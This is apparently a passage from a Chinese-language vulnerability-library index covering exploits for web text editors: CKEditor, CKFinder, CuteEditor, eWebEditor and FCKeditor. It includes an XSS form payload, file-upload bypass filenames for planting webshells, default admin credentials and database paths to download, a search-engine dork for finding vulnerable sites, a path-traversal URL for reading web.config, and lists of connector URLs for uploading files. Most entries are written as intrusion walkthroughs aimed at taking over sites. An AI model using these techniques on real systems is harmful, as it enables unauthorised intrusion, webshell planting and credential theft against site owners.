action=\"http://hacker1.own/admin/ckeditor/samples/sample_posteddata.php\" enctype=\"multipart/form-data\"&gt;\n&lt;input type=\"hidden\" name=\"&lt;script&gt;alert('AkaStep');&lt;/script&gt;\" id=\"fupl\" value=\"SENDF\"&gt;&lt;/li&gt;\n&lt;/form&gt;\n\n=================================================\n\nPrint Screen:  http://i062.radikal.ru/1302/e6/25ef023dd589.png\n\n\n\n=================================================\nAnd here is fixed version:  /ckeditor/samples/assets/posteddata.php\n\n================SNIP BEGINS=======================\n&lt;!DOCTYPE html&gt;\n&lt;?php\n/*\nCopyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.\nFor licensing, see LICENSE.html or http://ckeditor.com/license\n*/\n?&gt;\n&lt;html&gt;\n&lt;head&gt;\n  &lt;meta charset=\"utf-8\"&gt;\n  &lt;title&gt;Sample &amp;mdash; CKEditor&lt;/title&gt;\n  &lt;link rel=\"stylesheet\" href=\"sample.css\"&gt;\n&lt;/head&gt;\n&lt;body&gt;\n  &lt;h1 class=\"samples\"&gt;\n    CKEditor &amp;mdash; Posted Data\n  &lt;/h1&gt;\n  &lt;table border=\"1\" cellspacing=\"0\" id=\"outputSample\"&gt;\n    &lt;colgroup&gt;&lt;col width=\"120\"&gt;&lt;/colgroup&gt;\n    &lt;thead&gt;\n      &lt;tr&gt;\n        &lt;th&gt;Field&amp;nbsp;Name&lt;/th&gt;\n        &lt;th&gt;Value&lt;/th&gt;\n      &lt;/tr&gt;\n    &lt;/thead&gt;\n&lt;?php\n\nif ( isset( $_POST ) )\n  $postArray = &amp;$_POST ;      // 4.1.0 or later, use $_POST\nelse\n  $postArray = &amp;$HTTP_POST_VARS ;  // prior to 4.1.0, use HTTP_POST_VARS\n\nforeach ( $postArray as $sForm =&gt; $value )\n{\n  if ( get_magic_quotes_gpc() )\n    $postedValue = htmlspecialchars( stripslashes((string) $value ) ) ;\n  else\n  $postedValue =htmlspecialchars((string) $value ) ;\n\n?&gt;\n    &lt;tr&gt;\n      &lt;th style=\"vertical-align: top\"&gt;&lt;?php echo htmlspecialchars((string)$sForm);?&gt;&lt;/th&gt;\n      &lt;td&gt;&lt;pre class=\"samples\"&gt;&lt;?php echo $postedValue?&gt;&lt;/pre&gt;&lt;/td&gt;\n    &lt;/tr&gt;\n  &lt;?php\n}\n?&gt;\n  &lt;/table&gt;\n  &lt;div id=\"footer\"&gt;\n    &lt;hr&gt;\n    &lt;p&gt;\n      CKEditor - The text editor for the Internet - &lt;a class=\"samples\" href=\"http://ckeditor.com/\"&gt;http://ckeditor.com&lt;/a&gt;\n    &lt;/p&gt;\n    &lt;p id=\"copy\"&gt;\n      Copyright &amp;copy; 2003-2013, &lt;a class=\"samples\" href=\"http://cksource.com/\"&gt;CKSource&lt;/a&gt; - Frederico Knabben. All rights reserved.\n    &lt;/p&gt;\n  &lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n\n=============ENJOYYY====================\n\n               KUDOSSSSSSS\n=========================================\npacketstormsecurity.org\npacketstormsecurity.com\npacketstormsecurity.net\nsecurityfocus.com\ncxsecurity.com\nsecurity.nnov.ru\nsecurtiyvulns.com\nsecuritylab.ru\nsecunia.com\nsecurityhome.eu\nexploitsdownload.com\nosvdb.com\nwebsecurity.com.ua\n1337day.com\nitsecuritysolutions.org\n\nto all Aa Team + to all Azerbaijan Black HatZ\n+ *Especially to my bro CAMOUFL4G3 *\nTo All Turkish Hackers\n\nAlso special thanks to: ottoman38 &amp; HERO_AZE\n===========================================\n\n/AkaStep\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/CKfinder/CKfinder%201.4.3%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/","title":"CKfinder 1.4.3\u7f16\u8f91\u5668\u6f0f\u6d1e","text":"<p>CKFinder \u662f\u56fd\u5916\u4e00\u6b3e\u975e\u5e38\u6d41\u884c\u7684\u6240\u89c1\u5373\u6240\u5f97\u6587\u5b57\u7f16\u8f91\u5668,\u51761.4.3 asp.net\u7248\u672c\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8be5\u6f0f\u6d1e\u4e0a\u4f20\u4efb\u610f\u6587\u4ef6\u3002  CKFinder\u5728\u4e0a\u4f20\u6587\u4ef6\u7684\u65f6\u5019,\u5f3a\u5236\u5c06\u6587\u4ef6\u540d\uff08\u4e0d\u5305\u62ec\u540e\u7f00\uff09\u4e2d\u70b9\u53f7\u7b49\u5176\u4ed6\u5b57\u7b26\u8f6c\u4e3a\u4e0b\u5212\u7ebf_\uff0c\u4f46\u662f\u5728\u4fee\u6539\u6587\u4ef6\u540d\u65f6\u5374\u6ca1\u6709\u4efb\u4f55\u9650\u5236\uff0c\u4ece\u800c\u5bfc\u81f4\u53ef\u4ee5\u4e0a\u4f20  8090sec_php;1.jpg \u7b49\u7578\u5f62\u6587\u4ef6\u540d\uff0c\u6700\u7ec8\u5bfc\u81f4\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u3002</p> <p>\u5982\u56fe\uff1a</p> <p></p> <p>\u6ce8\u610f\u770b \u70b9\u88ab\u8fc7\u6ee4\u6389\u4e86 \u53d8\u6210\u4e86\u6a2a\u7ebf \u521a\u624d\u8bf4\u4e86 \u4e0a\u4f20\u6709\u8fc7\u6ee4\u4f46\u662f\u5728\u4fee\u6539\u6587\u4ef6\u540d\u65f6\u5374\u6ca1\u6709\u4efb\u4f55\u9650\u5236 \u63a5\u4e0b\u6765\u76f8\u4fe1\u4f60\u61c2\u7684.....</p> <p></p> <p>\u200b      </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Cute%20editor/Cute%20editor%20Asp.net%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","title":"Cute editor Asp.net \u89e3\u6790\u6f0f\u6d1e\u5229\u7528","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Cute%20editor/Cute%20editor%20Asp.net%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#cute-editor-aspnetiis","title":"Cute Editor Asp.Net\u7248\u5229\u7528iis\u89e3\u6790\u6f0f\u6d1e\u83b7\u5f97\u6743\u9650","text":"<p>\u5f71\u54cd\u7248\u672c\uff1a CuteEditor for ASP.NET\u4e2d\u6587\u7248\u8106\u5f31\u63cf\u8ff0\uff1a \u8106\u5f31\u63cf\u8ff0\uff1a CuteEditor\u5bf9\u4e0a\u4f20\u6587\u4ef6\u540d\u672a\u91cd\u547d\u540d\uff0c\u5bfc\u81f4\u5176\u53ef\u5229\u7528IIS\u6587\u4ef6\u540d\u89e3\u6790Bug\u83b7\u5f97webshell\u6743\u9650\u3002 \u653b\u51fb\u5229\u7528\uff1a \u53ef\u901a\u8fc7\u5728\u641c\u7d22\u5f15\u64ce\u4e2d\u952e\u5165\u5173\u952e\u5b57 inurl:Post.aspx?SmallClassID= \u6765\u627e\u5230\u6d4b\u8bd5\u76ee\u6807\u3002 \u5728\u7f16\u8f91\u5668\u4e2d\u70b9\u51fb\u201c\u591a\u5a92\u4f53\u63d2\u5165\u201d\uff0c\u4e0a\u4f20\u4e00\u4e2a\u540d\u4e3a\u201cxxx.asp;.avi\u201d\u7684\u7f51\u9a6c\uff0c\u4ee5\u6b64\u83b7\u5f97\u6743\u9650\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Cute%20editor/Cute%20editor%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/","title":"Cute editor\u672c\u5730\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Cute%20editor/Cute%20editor%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#cute-editor","title":"Cute Editor\u5728\u7ebf\u7f16\u8f91\u5668\u672c\u5730\u5305\u542b\u6f0f\u6d1e","text":"<p>\u5f71\u54cd\u7248\u672c: CuteEditor For Net 6.4 \u8106\u5f31\u63cf\u8ff0\uff1a \u53ef\u4ee5\u968f\u610f\u67e5\u770b\u7f51\u7ad9\u6587\u4ef6\u5185\u5bb9\uff0c\u5371\u5bb3\u8f83\u5927\u3002 \u653b\u51fb\u5229\u7528: http://navisec.it/CuteSoft_Client/CuteEditor/Load.ashx?type=image&amp;file=../../../web.config</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/EWeb%20editor/Eweb%E7%BC%96%E8%BE%91%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","title":"Eweb\u7f16\u8f91\u5668\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e","text":"<p>2.Ewebeditor\u7f16\u8f91\u5668</p> <p>Ewebeditor\u662f\u57fa\u4e8e\u6d4f\u89c8\u5668\u7684\u3001\u6240\u89c1\u5373\u6240\u5f97\u7684\u5728\u7ebfHTML\u7f16\u8f91\u5668\u3002\u5979\u80fd\u591f\u5728\u7f51\u9875\u4e0a\u5b9e\u73b0\u8bb8\u591a\u684c\u9762\u7f16\u8f91\u8f6f\u4ef6\uff08\u5982\uff1aWord\uff09\u6240\u5177\u6709\u7684\u5f3a\u5927\u53ef\u89c6\u7f16\u8f91\u529f\u80fd\u3002WEB\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u7528\u5979\u628a\u4f20\u7edf\u7684\u591a\u884c\u6587\u672c\u8f93\u5165\u6846 <code>&lt;TEXTAREA&gt;</code> \u66ff\u6362\u4e3a\u53ef\u89c6\u5316\u7684\u5bcc\u6587\u672c\u8f93\u5165\u6846\uff0c\u4f7f\u6700\u7ec8\u7528\u6237\u53ef\u4ee5\u53ef\u89c6\u5316\u7684\u53d1\u5e03HTML\u683c\u5f0f\u7684\u7f51\u9875\u5185\u5bb9\u3002eWebEditor!\u5df2\u57fa\u672c\u6210\u4e3a\u7f51\u7ad9\u5185\u5bb9\u7ba1\u7406\u53d1\u5e03\u7684\u5fc5\u5907\u5de5\u5177\uff01</p> <p>3.Ewebeditor\u5229\u7528\u6838\u5fc3</p> <p>\u5982\u4f55\u53d1\u73b0\u7f16\u8f91\u5668\u5730\u5740</p> <p>Ewebeditor\uff1a  \u9ed8\u8ba4\u540e\u53f0\uff1aewebeditor/admin_login.asp  \u9ed8\u8ba4\u6570\u636e\u5e93\uff1aewebeditor/db/ewebeditor.mdb  \u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801\uff1aadmin admin/admin888</p> <p>4.\u5229\u7528\u8fc7\u7a0b</p> <p>\u901a\u5e38\u5165\u4fb5ewebeditor\u7f16\u8f91\u5668\u7684\u6b65\u9aa4\u5982\u4e0b:</p> <p>1\u3001\u9996\u5148\u8bbf\u95ee\u9ed8\u8ba4\u7ba1\u7406\u9875\u770b\u662f\u5426\u5b58\u5728</p> <p>\u200b    \u9ed8\u8ba4\u7ba1\u7406\u9875\u5730\u57402.80\u4ee5\u524d\u4e3a ewebeditor/admin_login.asp \u4ee5\u540e\u7248\u672c\u4e3aadmin/login.asp(\u5176\u4ed6\u8bed\u8a00\u6539\u540e\u6233,\u8fd9\u91cc\u4ee5asp\u4e3a\u4f8b) \u3002</p> <p></p> <p>2\u3001\u9ed8\u8ba4\u7ba1\u7406\u5e10\u53f7\u5bc6\u7801</p> <p>\u200b    \u9ed8\u8ba4\u7ba1\u7406\u9875\u5b58\u5728\uff01\u6211\u4eec\u5c31\u7528\u5e10\u53f7\u5bc6\u7801\u767b\u9646\uff01\u9ed8\u8ba4\u5e10\u53f7\u5bc6\u7801\u4e3a: admin admin888 \uff01\u5e38\u7528\u7684\u5bc6\u7801\u8fd8\u6709admin admin999 admin1 admin000 \u4e4b\u7c7b\u7684\u3002</p> <p>3\u3001\u9ed8\u8ba4\u6570\u636e\u5e93\u5730\u5740</p> <p>\u200b    \u5982\u679c\u5bc6\u7801\u4e0d\u662f\u9ed8\u8ba4\u7684\u3002\u6211\u4eec\u8bbf\u95ee\u7684\u5c31\u4e0d\u662f\u9ed8\u8ba4\u6570\u636e\u5e93\uff01\u5c1d\u8bd5\u4e0b\u8f7d\u6570\u636e\u5e93\u5f97\u5230\u7ba1\u7406\u5458\u5bc6\u7801\uff01\u7ba1\u7406\u5458\u7684\u5e10\u53f7\u5bc6\u7801\uff0c\u90fd\u5728eWebEditor_System\u8868\u6bb5\u91cc\uff0csys_UserName Sys_UserPass \u90fd\u662fmd5\u52a0\u5bc6\u7684\u3002\u5f97\u5230\u4e86\u52a0\u5bc6\u5bc6\u7801\u3002\u53ef\u4ee5\u53bbwww.cmd5.com www.xmd5.org \u7b49\u7f51\u7ad9\u8fdb\u884c\u67e5\u8be2\uff01\u66b4\u529b\u8fd9\u6d3b\u597d\u4e45\u4e0d\u5e72\u4e86\uff01\u4e5f\u53ef\u4ee5\u4e22\u56fd\u5916\u4e00\u4e9b\u53ef\u4ee5\u8dd1\u5bc6\u7801\u7684\u7f51\u7ad9\u53bb\u8dd1!</p> <p>\u9ed8\u8ba4\u6570\u636e\u5e93\u8def\u5f84\u4e3a:ewebeditor/db/ewebeditor.mdb \u5e38\u7528\u6570\u636e\u5e93\u8def\u5f84\u4e3a:</p> <p>ewebeditor/db/ewebeditor.asa </p> <p>ewebeditor/db/ewebeditor.asp</p> <p>ewebeditor/db/#ewebeditor.asa </p> <p>ewebeditor/db/#ewebeditor.mdb</p> <p>ewebeditor/db/!@#ewebeditor.asp </p> <p>ewebeditor/db/ewebeditor1033.mdb \u7b49\u7b49\u3002</p> <p></p> <p>\u200b    \u5f88\u591a\u7ba1\u7406\u5458\u5e38\u6539.asp\u540e\u7f00\uff0c\u4e00\u822c\u8bbf\u95ee.asp .asa \u540e\u7f00\u7684\u90fd\u662f\u4e71\u7801\uff01\u53ef\u4ee5\u7528\u4e0b\u8f7d\u5de5\u5177\u4e0b\u8f7d\u4e0b\u6765\uff0c\u7136\u540e\u66f4\u6539\u540e\u7f00\u4e3a.mdb\u6765\u67e5\u770b\u5185\u5bb9\uff01</p> <p>4\u3001\u6f0f\u6d1e\u57fa\u672c\u5229\u7528\u6b65\u9aa4\uff0c\u4ee5asp\u4e3a\u4f8b\uff01</p> <p>\u767b\u9646\u540e\u53f0\u4ee5\u540e\u3002\u9009\u62e9\u6837\u5f0f\u7ba1\u7406\uff0c\u9ed8\u8ba4\u7f16\u8f91\u5668\u7684\u9ed8\u8ba4\u6837\u5f0f\u90fd\u4e0d\u53ef\u4ee5\u4fee\u6539\u7684\u3002 \u6211\u4eec\u53ef\u4ee5\u4ece\u4efb\u610f\u6837\u5f0f\u65b0\u5efa\u4e00\u4e2a\u6837\u5f0f\uff0c\u7136\u540e\u5728\u56fe\u7247\u4e0a\u4f20\u6dfb\u52a0\u53ef\u4e0a\u4f20\u540e\u7f00\u3002.asa .cer .cdx \u7b49\uff01.asp \u8fc7\u6ee4\u8fc7\u4e86\u3002 \u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u7528.aaspsp\u540e\u7f00\u6765\u6dfb\u52a0\uff0c\u8fd9\u6837\u4e0a\u4f20\u6587\u4ef6\u6b63\u597d\u88abewebeditor \u5403\u6389asp\u540e\u7f00\uff0c\u5269\u4e0b.asp \u3002 \u540c\u6837\uff0c\u5982\u679c\u9047\u5230\u4e00\u4e2a\u7ba1\u7406\u5458\u6709\u5b89\u5168\u610f\u8bc6\u7684\uff0c\u4ece\u4ee3\u7801\u91cc\uff0c\u628a.asp .asa .cer .cdx  \u90fd\u5b8c\u5168\u7981\u6b62\u4e86\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u7528.asasaa \u540e\u7f00\u6765\u7a81\u7834\u3002 \u6dfb\u52a0\u5b8c\u4e86\u540e\u7f00\uff0c\u53ef\u4ee5\u5728\u6837\u5f0f\u7ba1\u7406\uff0c\u70b9\u51fb\u9884\u89c8\uff0c\u7136\u540e\u4e0a\u4f20\uff01</p> <p>asa|cer|asp|aaspsp</p> <p>Asa cer \u5b83\u53ef\u4ee5\u5728iis6.0\u5e73\u53f0\u89e3\u6790\u4e3aasp\u6267\u884c</p> <p>Aaspsp\uff1a\u7ed5\u8fc7\u8fc7\u6ee4 \u8fc7\u6ee4asp aaspsp=\u300basp</p> <p>\u6ce8\u610f\uff1a\u4f4e\u7248\u672cewebeditor\u4e0d\u652f\u6301ie7.0\u4ee5\u4e0b\u7248\u672c\u8bbf\u95ee\uff08ietest\u8f6f\u4ef6\u6a21\u62dfie6.0\u4e0a\u4f20\uff09</p> <p>\u4ee5\u4e0b\u4ee52.1.6\u8fd9\u4e2a\u7248\u672c\u4e3a\u4f8b\u6765\u6f14\u793a:</p> <p>\u70b9\u51fb\u6837\u5f0f\u7ba1\u7406,\u7136\u540e\u65b0\u589e\u6837\u5f0f</p> <p></p> <p>\u5728\u56fe\u7247\u7c7b\u578b\u4e2d\u52a0\u5165\u4ee5\u4e0b\u7c7b\u578b:asa|cer|asp|aaspsp</p> <p></p> <p>\u7136\u540e\u70b9\u51fb\u63d0\u4ea4\u3002</p> <p></p> <p>\u7136\u540e\u5728\u5de5\u5177\u680f\u91cc\u65b0\u589e\u5de5\u5177</p> <p></p> <p></p> <p>\u5728\u6309\u94ae\u8bbe\u7f6e\u91cc\u65b0\u589e\"\u63d2\u5165\u6216\u4fee\u6539\u56fe\u7247\"</p> <p></p> <p>\u7136\u540e\u70b9\u51fb\u4fdd\u5b58\u8bbe\u7f6e\u3002\u7136\u540e\u518d\u56de\u53bb\u70b9\u51fb\u9884\u89c8\u3002</p> <p></p> <p>\u63a7\u4ef6\u6548\u679c\u5c31\u51fa\u6765\u4e86\u3002\u7136\u540e\u76f4\u63a5\u4e0a\u4f20\u4e00\u53e5\u8bdd\u6728\u9a6c</p> <p></p> <p>\u70b9\u51fb\u786e\u5b9a\uff0c\u4e0a\u4f20\u6210\u529f\uff0c\u4e4b\u540e\uff0c\u67e5\u770b\u4ee3\u7801\uff0c\u5c31\u80fd\u770b\u5230\u5b8c\u6574\u7684\u5730\u5740</p> <p></p> <p>\u7528\u83dc\u5200\u4e00\u8fde\u5c31\u80fd\u5c31OK\u4e86\u3002\u3002\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/EWeb%20editor/Eweb%E7%BC%96%E8%BE%91%E5%99%A8%E5%89%8D%E6%94%BB%E5%87%BB%E7%97%95%E8%BF%B9%E6%9F%A5%E7%9C%8B/","title":"Eweb\u7f16\u8f91\u5668\u524d\u653b\u51fb\u75d5\u8ff9\u67e5\u770b","text":"<p>\u5bfb\u627e\u524d\u4eba\u75d5\u8ff9\u518d\u6b21\u5165\u4fb5</p> <p>\u6709\u65f6\u5019\u7528\u6237\u540d\u4e0e\u5bc6\u7801\u5f97\u7b49\u4e0d\u8fdb\u53bb\uff0c\u4f46\u662f\u6570\u636e\u5e93\u53ef\u4ee5\u4e0b\u8f7d\uff0c\u8fd9\u65f6\u5019\u5c31\u53ef\u4ee5\u770b\u4e0b\u662f\u5426\u6709\u524d\u4eba\u5165\u4fb5\u8fc7\uff0c\u5982\u679c\u6709\u4eba\u5165\u4fb5\u8fc7\u7684\u8bdd\uff0c\u5c31\u53ef\u4ee5\u5229\u7528\u4e0b\u9762\u7684\u65b9\u6cd5\u8fdb\u5165\u7a81\u7834\u3002</p> <p>\u5982\u4f55\u5224\u65ad\u6709\u524d\u4eba\u5165\u4fb5\u8fc7\u4e86??\u4e0b\u8f7d\u597d\u6570\u636e\u5e93\u4e4b\u540e\u67e5\u770b\u4ed6\u7684eWebEditor_style\u8868\u4e2d\u7684S_ImageExt\u5b57\u6bb5\u662f\u5426\u6709\u88ab\u4eba\u6dfb\u52a0\u8fc7\u4ec0\u4e48\u3002</p> <p></p> <p>\u4f7f\u7528\u4e0b\u9762\u7684\u8bed\u53e5\u8fdb\u5165\u7a81\u7834:</p> <pre><code>ewebeditor.asp?ID=xx&amp;style=yy\n</code></pre> <p>\u5176\u4e2d\u7684id=xx\u5c31\u662f\u88ab\u4fee\u6539\u8fc7\u7684\u90a3\u6761\u8bb0\u5f55\u7684id\uff0c\u800cyy\u5c31\u662fS_name\u5b57\u6bb5\u7684\u540d\u5b57\u3002</p> <p></p> <p>\u4f8b\u5982\u8fd9\u91cc\u5c31\u4fee\u6539\u6210: ewebeditor.asp?ID=54&amp;style=testckse \u53bb\u8bbf\u95ee</p> <p></p> <p>\u56fe\u7247\u63a7\u4ef6\u5c31\u51fa\u6765\u4e86\u3002\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/EWeb%20editor/Eweb%E7%BC%96%E8%BE%91%E5%99%A8%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/","title":"Eweb\u7f16\u8f91\u5668\u76ee\u5f55\u904d\u5386\u6f0f\u6d1e","text":"<p>2\uff09\u76ee\u5f55\u904d\u5386</p> <p>\u70b9\u51fb\"\u4e0a\u4f20\u6587\u4ef6\u7ba1\u7406\" \u7136\u540e\u9009\u62e9\u6837\u5f0f\u76ee\u5f55\u3002</p> <p></p> <p>\u5728id=14\u540e\u9762\u52a0\u4e0a&amp;dir=../</p> <pre><code>http://192.168.87.129:8123/admin_uploadfile.asp?id=14&amp;dir=../\n</code></pre> <p></p> <p>\u53d1\u73b0\u6ca1\u6709\u8d77\u4f5c\u7528\uff0c\u90a3\u5c31\u662f2.1.6\u8fd9\u4e2a\u7248\u672c\u4e0d\u5b58\u5728\u8fd9\u4e2a\u6f0f\u6d1e\u3002\u6362\u62102.8.0\u30022.8.0\u5b58\u5728\u8fd9\u4e2a\u6f0f\u6d1e</p> <p></p> <p>\u80fd\u904d\u5386\u76ee\u5f55\u3002</p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/FCKeditor/FCKeditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%9D%80/","title":"FCKeditor\u7f16\u8f91\u5668\u6e17\u900f\u601d\u8def","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/FCKeditor/FCKeditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%9D%80/#1fckeditor","title":"1.\u67e5\u770bFCKeditor\u7248\u672c","text":"<pre><code>http://127.0.0.1/fckeditor/editor/dialog/fck_about.html\nhttp://127.0.0.1/FCKeditor/_whatsnew.html\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/FCKeditor/FCKeditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%9D%80/#2fckasp","title":"2.\u4e00\u4e9bFCK\u9ed8\u8ba4\u94fe\u63a5(\u4ee5asp\u4e3a\u4f8b)\uff1a","text":"<pre><code>\u4e0a\u4f20\u6d4b\u8bd5\u9875\u9762\uff1aFckeditor\u7f16\u8f91\u5668\u9ed8\u8ba4\u4f1a\u5b58\u5728test.html\u548cuploadtest.html\u6587\u4ef6\uff0c\u76f4\u63a5\u8bbf\u95ee\u8fd9\u4e9b\u6587\u4ef6\u53ef\u4ee5\u83b7\u53d6\u5f53\u524d\u6587\u4ef6\u5939\u6587\u4ef6\u540d\u79f0\u4ee5\u53ca\u4e0a\u4f20\u6587\u4ef6\uff0c\u6709\u7684\u7248\u672c\u53ef\u4ee5\u76f4\u63a5\u4e0a\u4f20\u4efb\u610f\u6587\u4ef6\u7c7b\u578b\uff0c\u6d4b\u8bd5\u4e0a\u4f20\u5730\u5740\u6709\uff1a\nFCKeditor/editor/filemanager/browser/default/connectors/test.html\nFCKeditor/editor/filemanager/upload/test.html\nFCKeditor/editor/filemanager/connectors/test.html\nFCKeditor/editor/filemanager/connectors/uploadtest.html\n\n\u793a\u4f8b\u9875\u9762\uff1a\nFCKeditor/_samples/default.html\nFCKeditor/_samples/asp/sample01.asp\nFCKeditor/_samples/asp/sample02.asp\nFCKeditor/_samples/asp/sample03.asp\nFCKeditor/_samples/asp/sample04.asp\n\n\u8fde\u63a5\u5668\uff1a\nFCKeditor/editor/filemanager/connectors/asp/connector.asp\nFCKeditor/editor/filemanager/connectors/aspx/connector.aspx\n\n\u521b\u5efa\u6587\u4ef6\u5939\u94fe\u63a5\uff1a\nFCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/&amp;NewFolderName=test\n\n\u4e0a\u4f20\u9875\u9762\uff1a\nFckeditor/editor/filemanager/browser/default/browser.html?Type=file&amp;Connector=connectors/asp/connector.Asp\nFckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/asp/connector.asp\nFCKeditor/editor/filemanager/browser/default/browser.html?Type=all&amp;Connector=connectors/asp/connector.asp\nFCKeditor/editor/filemanager/browser/default/browser.html?Type=/&amp;Connector=connectors/asp/connector.asp\nFCKeditor/editor/filemanager/browser/default/browser.html?Type=monyer&amp;Connector=connectors/asp/connector.asp\n\n\u6709\u65f6\u5019\uff0c\u7f51\u7ad9\u7ba1\u7406\u5458\u4f1a\u628a\u4e0a\u4f20\u9875\u9762\u7981\u6b62\u521b\u5efa\u6587\u4ef6\u5939\u548c\u4e0a\u4f20\u6587\u4ef6\uff0c\u4f46\u662f\u7531\u4e8e\u7f51\u7ad9\u7ba1\u7406\u5458\u7684\u914d\u7f6e\u4e0d\u5f53\uff0c\u6211\u4eec\u7684\u8fde\u63a5\u5668\u5199\u7edd\u5bf9\u8def\u5f84\u7684\u8bdd\uff0c\u6709\u65f6\u5019\u53ef\u4ee5\u521b\u5efa\u6587\u4ef6\u5939\u548c\u4e0a\u4f20\u6587\u4ef6\nFckeditor/editor/filemanager/browser/default/browser.html?Type=file&amp;Connector=http://ww.xxx.com/connectors/asp/connector.Asp\nFckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=http://ww.xxx.com/connectors/asp/connector.asp\nFckeditor/editor/filemanager/browser/default/browser.html?Type=Flash&amp;Connector=http://ww.xxx.com/connectors/asp/connector.asp\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/FCKeditor/FCKeditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%9D%80/#3","title":"3.\u4e0a\u4f20\u7ed5\u8fc7","text":"<p>\u68c0\u6d4b\u6587\u4ef6\u540d\u4e2d\u7684\u2018.\u2019\u4fee\u6539\u4e3a\u2018_\u2019\uff0c\u7ed5\u8fc7\u65b9\u5f0f\uff1a</p> <p>1.\u5728\u4e0a\u4f20\u4e86\u8bf8\u5982*shell.asp;.jpg*\u7684\u6587\u4ef6\u540e\uff0c\u4f1a\u81ea\u52a8\u5c06\u6587\u4ef6\u540d\u6539\u4e3a*shell_asp;.jpg*\u3002\u53ef\u4ee5\u7ee7\u7eed\u4e0a\u4f20\u540c\u540d\u6587\u4ef6\uff0c\u6587\u4ef6\u540d\u4f1a\u53d8\u4e3a*shell.asp;(1).jpg*</p> <p>2.\u914d\u5408web\u670d\u52a1\u5668\u89e3\u6790\u6f0f\u6d1e\u7b49\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e</p> <p>3.\u7a81\u7834\u5efa\u7acb\u6587\u4ef6\u5939\uff1a</p> <p>FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/&amp;NewFolderName=test</p> <p>FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/xx.asp&amp;NewFolderName=x.asp</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/FCKeditor/FCKeditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%9D%80/#_1","title":"FCKeditor\u7f16\u8f91\u5668\u6e17\u900f\u601d\u8def","text":"<p>=================================================================================FCKeditor\u7f16\u8f91\u5668</p> <p>\u53ef\u4ee5\u53bb\u8fd9\u4e0b\u8f7d\u7f16\u8f91\u5668:http://download.csdn.net/detail/u011781521/9767326</p> 